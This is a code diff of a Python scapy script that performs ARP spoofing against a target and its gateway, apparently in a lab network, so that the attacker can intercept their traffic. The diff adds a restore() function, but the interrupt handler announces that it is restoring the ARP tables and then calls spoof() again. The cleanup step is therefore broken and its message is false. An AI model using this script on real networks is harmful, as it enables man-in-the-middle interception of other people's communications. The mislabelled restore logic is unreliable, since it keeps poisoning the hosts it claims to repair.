@@ -1,6 +1,7 @@
 import scapy.all as scapy
 import time
 import sys
+
 def get_mac(ip):
     # This will allow us to create an ARP reqest ( who is x.x.x.x)
     arp_request= scapy.ARP(pdst=ip)
@@ -29,12 +30,21 @@ def spoof(target_ip, spoof_ip):
     packet= scapy.ARP(op=2, pdst= target_ip, hwdst= target_mac, psrc= spoof_ip)
     scapy.send(packet, verbose= False)
 
+
+def restore(destination_ip, source_ip):
+    destination_mac= get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet= scapy.ARP(op=2, pdst= destination_ip, hwdst= destination_mac,
+                      psrc= source_ip, hwsrc= source_mac)
+    scapy.send(packet, count=4, verbose= False)
 if __name__ == "__main__":
+    target_ip= "10.0.2.15"
+    gateway_ip= "10.0.2.1"
     sent_packet_count=0
     try:
         while True:
-            spoof("10.0.2.15", "10.0.2.1")
-            spoof("10.0.2.1", "10.0.2.15")
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
             sent_packet_count += 2
             # The comma at the end tells python to print
             # everything on one line but only when the
@@ -53,4 +63,6 @@ if __name__ == "__main__":
             # sys.stdout.flush()
             time.sleep(2)
     except (KeyboardInterrupt):
-        sys.exit("User Manually Stopped Program with CTRL+c")
+        print("\nUser Manually Stopped Program with CTRL+c. Restoring arp tables of targeted devices")
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
